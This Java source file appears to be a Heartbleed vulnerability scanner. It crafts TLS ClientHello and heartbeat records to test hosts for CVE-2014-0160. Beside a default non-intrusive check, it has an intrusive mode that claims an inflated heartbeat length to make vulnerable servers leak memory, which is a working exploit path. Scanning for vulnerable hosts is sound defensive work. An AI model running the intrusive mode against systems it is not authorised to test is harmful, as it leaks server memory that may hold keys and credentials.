/*
 * Copyright 2014 Google Inc. All rights reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 *   Unless required by applicable law or agreed to in writing, software
 *   distributed under the License is distributed on an "AS IS" BASIS,
 *   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *   See the License for the specific language governing permissions and
 *   limitations under the License.
 */
package com.heartbleed;
import com.google.common.base.Preconditions;
import com.google.common.base.Strings;
import com.google.common.base.Throwables;

import com.heartbleed.tls.CipherSuite;
import com.heartbleed.tls.ContentType;
import com.heartbleed.tls.TlsVersion;
import com.heartbleed.tls.records.HandshakeRecord;
import com.heartbleed.tls.records.HeartbeatResponseMessage;
import com.heartbleed.tls.records.TlsRecord;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.nio.ByteBuffer;
import java.security.SecureRandom;
import java.util.Arrays;
import java.util.List;
import java.util.logging.Logger;

import javax.net.SocketFactory;


public class HeartbleedScanner {

  private static final Logger logger = Logger.getLogger(HeartbleedScanner.class.getName());
  private static final SecureRandom secureRandom = new SecureRandom();
  private static final SocketFactory socketFactory = SocketFactory.getDefault();
  private static final int MINIMUM_PADDING_LENGTH = 16;
  public static final String INTRUSIVE_MODE_PROPERTY = "heartbleed.scan_mode";

  public static enum ScanMode {
    /**
     * Attempts to actually leak data from the remote system to verify the vulnerability.
     */
    INTRUSIVE(MINIMUM_PADDING_LENGTH),
    /**
     * Uses approach described in https://blog.mozilla.org/security/2014/04/12/
     */
    NON_INTRUSIVE(0);

    private final String padding;

    private ScanMode(int paddingLength) {
      if (paddingLength != 0) { 
        padding = generateRandomPadding(paddingLength);
      } else {
        padding = null;
      }
    }

    public String getPaddingString() {
      return padding;
    }
  }

  @SuppressWarnings("unused")
  private static void dumpPacket(byte[] bytes) {
    System.err.println(String.format("Length: %02x", bytes.length));
    for (int i = 0; i < bytes.length; i++) {
      System.err.print(String.format("%02x ", bytes[i]));
      if ((i + 1) % 16 == 0) {
        System.err.print("\n");
      }
    }
    System.err.print("\n");
  }

  private static byte[] intToUint24(int value) {
    Preconditions.checkArgument(value < (1 << 24));
    ByteBuffer original = ByteBuffer.allocate(4).putInt(value);
    ByteBuffer output = ByteBuffer.allocate(3);
    for (int i = 0; i < output.capacity(); i++) {
      output.put(original.get(i + 1));
    }
    return output.array();
  }

  private static byte[] intToUint16(int value) {
    // Most TLS records are restricted to size less than 2^14.
    Preconditions.checkArgument(value < (1 << 14));
    ByteBuffer original = ByteBuffer.allocate(4).putInt(value);
    ByteBuffer output = ByteBuffer.allocate(2);
    for (int i = 0; i < output.capacity(); i++) {
      output.put(original.get(i + 2));
    }
    return output.array();
  }

  private static String generateRandomPadding(int length) {
    Preconditions.checkArgument(length > 0);
    StringBuilder sb = new StringBuilder(length);
    for (int i = 0; i < length; i++) {
      sb.append((char) (0x41 + secureRandom.nextInt(26)));
    }
    return sb.toString();
  }

  /**
   * See http://tools.ietf.org/html/rfc5246#page-39
   */
  private static byte[] buildClientHello(TlsVersion version, List<CipherSuite> cipherSuites) {
    Preconditions.checkNotNull(version);
    Preconditions.checkNotNull(cipherSuites);

    final byte MSG_TYPE_CLIENT_HELLO = 0x01; 
    int clientHelloLength = 1 + /* message type */
        3 + /* uint24 length */
        2 + /* ProtocolVersion */
        4 + /* uint32 Random.gmt_unix_time */
        28 + /* opaque Random.random_bytes[28] */
        1 + /* session ID length */
        2 + /* cipher suite length */
        2 * cipherSuites.size() +
        1 + /* compression length */
        1; /* compression */

    byte[] random_bytes = new byte[28];
    secureRandom.nextBytes(random_bytes);

    ByteBuffer random = ByteBuffer.allocate(32);
    random.put(ByteBuffer.allocate(4).putInt((int) (System.currentTimeMillis() / 1000)).array());
    random.put(random_bytes);

    ByteBuffer clientHelloBuffer = ByteBuffer.allocate(clientHelloLength);
    clientHelloBuffer.put(MSG_TYPE_CLIENT_HELLO);
    clientHelloBuffer.put(intToUint24(clientHelloLength - 4));
    clientHelloBuffer.put(version.getBytes());
    clientHelloBuffer.put(random.array());

    // Session ID length.
    clientHelloBuffer.put((byte) 0x00);

    clientHelloBuffer.put(intToUint16(cipherSuites.size() * 2));
    for (CipherSuite suite : cipherSuites) {
      clientHelloBuffer.put(suite.getBytes());
    }

    // Compression length / null compression.
    clientHelloBuffer.put((byte) 0x01);
    clientHelloBuffer.put((byte) 0x00);

    int tlsRecordLength = 1 + /* content type */
        2 + /* protocol version */
        2 + /* length */
        clientHelloLength; /* fragment */
    ByteBuffer tlsRecord =
        ByteBuffer.allocate(tlsRecordLength)
        .put(ContentType.HANDSHAKE.getBytes())
        .put(version.getBytes())
        .put(intToUint16(clientHelloLength))
        .put(clientHelloBuffer.array());
    return tlsRecord.array();
  }

  /**
   * see https://tools.ietf.org/html/rfc6520#section-2
   */ 
  private static byte[] buildHeartbeatMessage(TlsVersion version, ScanMode mode) {
    Preconditions.checkNotNull(version);

    // https://tools.ietf.org/html/rfc6520#section-6
    final byte TLS_HEARTBEAT_CONTENT_TYPE = 0x18;

    String payload = null;
    byte [] payloadBytes = null;
    byte [] paddingBytes = null;

    if (mode.equals(ScanMode.INTRUSIVE)) {
      payload = "foo";
      payloadBytes = payload.getBytes();
      paddingBytes = mode.getPaddingString().getBytes();
    } else {
      // This sends a large message, but without the requisite 16 bytes of padding.
      payload = Strings.repeat("A", 5000);
      payloadBytes = payload.getBytes();
      paddingBytes = "".getBytes();
    }

    int heartbeatLength = 1 + /* message type */
        2 + /* uint16 length */
        payloadBytes.length +
        paddingBytes.length;


    ByteBuffer heartbeatMessage = ByteBuffer.allocate(heartbeatLength);
    heartbeatMessage.put((byte) 0x01); // heartbeat request
    if (mode.equals(ScanMode.INTRUSIVE)) {
      // Claim a length of 2^14 -1 to trigger an overread.
      heartbeatMessage.put(intToUint16(0x3FFF));
    } else {
      // Do not include the message type or int16 length.
      heartbeatMessage.put(intToUint16(heartbeatLength - 3));
    }
    heartbeatMessage.put(payloadBytes);
    heartbeatMessage.put(paddingBytes);

    int tlsRecordLength = 1 + /* content type */
        2 + /* protocol version */
        2 + /* length */
        heartbeatLength; /* fragment */

    ByteBuffer tlsRecord = ByteBuffer.allocate(tlsRecordLength);
    tlsRecord.put(TLS_HEARTBEAT_CONTENT_TYPE);
    tlsRecord.put(version.getBytes());
    tlsRecord.put(intToUint16(heartbeatLength));
    tlsRecord.put(heartbeatMessage.array());
    return tlsRecord.array();
  }

  private static void sendBytes(Socket socket, byte[] bytes) {
    Preconditions.checkNotNull(socket);
    Preconditions.checkNotNull(bytes);
    try {
      OutputStream outputStream = socket.getOutputStream();
      outputStream.write(bytes);
    } catch (IOException e) {
      Throwables.propagate(e);
    }
  }

  private static TlsRecord readTlsRecord(Socket socket) {
    Preconditions.checkNotNull(socket);

    byte[] tlsRecordHeader = new byte[5];
    int index = 0;
    TlsRecord tlsRecord = null;
    try {
      InputStream inputStream = socket.getInputStream();
      while (index != tlsRecordHeader.length) {
        index += inputStream.read(tlsRecordHeader, index,
            tlsRecordHeader.length - index);
      }
      ByteBuffer wrapped = ByteBuffer.wrap(tlsRecordHeader);
      wrapped.position(3);
      short messageLength = wrapped.getShort();

      ByteBuffer record = ByteBuffer.allocate(messageLength + tlsRecordHeader.length);
      record.put(tlsRecordHeader);
      int next = 0;
      index = 0;
      while (index != messageLength && next != -1) {
        next = inputStream.read();
        record.put((byte) next);
        index++;
      }
      if (index != messageLength) {
        throw new IllegalStateException("Read " + index + " bytes, expected " + messageLength);
      }
      tlsRecord = TlsRecord.tlsRecordForBytes(record.array());
    } catch (SocketTimeoutException e) {
      // ignore.
    } catch (IOException e) {
      Throwables.propagate(e);
    }
    return tlsRecord;
  }

  public static ScanMode getScanMode() {
    ScanMode mode = ScanMode.NON_INTRUSIVE;
    String scanMode = System.getProperty(INTRUSIVE_MODE_PROPERTY);

    if ("intrusive".equals(scanMode)) {
      mode = ScanMode.INTRUSIVE;
    }
    return mode;
  }

  public static boolean testHostForHeartbleed(String host) {
    return testHostForHeartbleed(host, 443, getScanMode());
  }

  public static boolean testHostForHeartbleed(String host, int port, ScanMode mode) {
    Preconditions.checkArgument(!host.isEmpty());
    boolean isVulnerable = false;
    try {
      for (TlsVersion version : TlsVersion.values()) {
        Socket socket = socketFactory.createSocket(host, port);
        socket.setSoTimeout(5000);
        sendBytes(socket, buildClientHello(version, Arrays.asList(CipherSuite.values())));
        TlsRecord record = null;
        boolean doneReadingRecords = false;
        do {
          record = readTlsRecord(socket);
          if (record != null &&
              record.getContentType() == ContentType.ALERT ||
              record.getContentType() == ContentType.HANDSHAKE &&
              ((HandshakeRecord) record).isServerHelloDone()) {
            doneReadingRecords = true;
          }
        } while (!doneReadingRecords && record != null);

        if (record == null || record.getContentType() == ContentType.ALERT) {
          continue;
        }

        sendBytes(socket, buildHeartbeatMessage(version, mode));

        boolean receivedAlertOrHeartbeatResponse = false;
        while (!receivedAlertOrHeartbeatResponse) {
          record = readTlsRecord(socket);
          if (record == null || record.getContentType() == ContentType.ALERT) {
            receivedAlertOrHeartbeatResponse = true;
          } else if (record.getContentType() == ContentType.HEARTBEAT) {
            receivedAlertOrHeartbeatResponse = true;
            if (mode.equals(ScanMode.NON_INTRUSIVE)) {
              isVulnerable = true;
            } else if (((HeartbeatResponseMessage) record)
                .responseContainsByteSequence(mode.getPaddingString().getBytes())) {
              isVulnerable = true;
            }
          } else {
            logger.warning("Unexpected record type after heartbeat: " + record.getContentType());
          }
        }
        socket.close();
        if (isVulnerable) {
          return true;
        }
      }
    } catch (IOException e) {
      Throwables.propagate(e);
    }
    return isVulnerable;
  }

  public static void main(String[] args) {
    for (String host : args) {
      System.out.println(host + " : " + Boolean.toString(testHostForHeartbleed(host)));
    }
  }
}
